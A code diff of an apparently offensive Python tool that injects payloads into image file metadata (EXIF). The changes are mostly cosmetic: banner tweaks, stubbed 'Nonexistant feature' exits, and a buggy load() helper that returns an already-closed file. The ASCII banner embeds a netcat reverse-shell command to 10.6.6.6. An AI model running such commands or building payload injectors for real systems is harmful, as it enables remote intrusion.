@@ -31,8 +31,8 @@ BANNER = '''
           ____               __          _       _ 
          / __ \_____        / /   __  __(_)___ _(_)
         / / / / ___/       / /   / / / / / __ `/ / 
-       / /_/ / /  _       / /___/ /_/ / / /_/ / /  
-      /_____/_/  (_)     /_____/\__,_/_/\__, /_/   
+       / /_/ / /   _      / /___/ /_/ / / /_/ / /  
+      /_____/_/   (_)    /_____/\__,_/_/\__, /_/       
                                       /____/   
               .----------------------------------|    (   
 -----========| .....nc -e /bin/sh 10.6.6.6 1337 ######|
@@ -97,7 +97,7 @@ class Image(Injector):
 
 @dataclass
 class Search:
-    """Parent class for search engine classes. """
+    """Parent class for search engine classes."""
     query: str
     srchmode: str
     url: Any = None
@@ -151,6 +151,14 @@ class Google(Search):
             self.url = self.smallest_image_url(urls)
 
 
+def load(filepath):
+
+    absbpath = os.path.abspath(filepath)
+
+    with open(absbpath, 'rb') as f:
+        return f
+
+            
 def search(query, searchtype, searchmode, searchdir):
     """Accepts a query and a filename."""
 
@@ -179,23 +187,39 @@ def search(query, searchtype, searchmode, searchdir):
 
     if searchtype == "image":
         obj = Image(filepath)
-    
+    elif searchtype == "pdf":
+        print("Nonexistant feature")
+        exit()
+        # obj = Pdf(filepath)
+    elif searchtype == "rtf":
+        print("Nonexistant feature")
+        exit()
+        # obj = Rtf(filepath)
+    else:
+        print("Nonexistant feature")
+        exit()    
+
     return obj 
 
 
 def inject(obj, injection_method, payload):
     """Accepts a filename, payload, and method.
        Injects the payload into image file based on the selected method.
+
+       TODO: re-design class structure between injector and image classes
+       to avoid calling obj.load_exif.
     """
 
     # Load method
     obj.load_method(injection_method)    
     obj.load_exif()  
+
     # Call injection method by reference.
     getattr(obj, obj.method)(obj.filepath, payload)
     obj.load_exif()
 
     return obj
+
 
 if __name__ == "__main__":
 
@@ -222,5 +246,6 @@ if __name__ == "__main__":
     if args.type == 'image': 
         output = [[k,v] for k, v in result.exifdata.items()]
     
+           
     cprint(BANNER, 'green')
     print(tabulate(output))
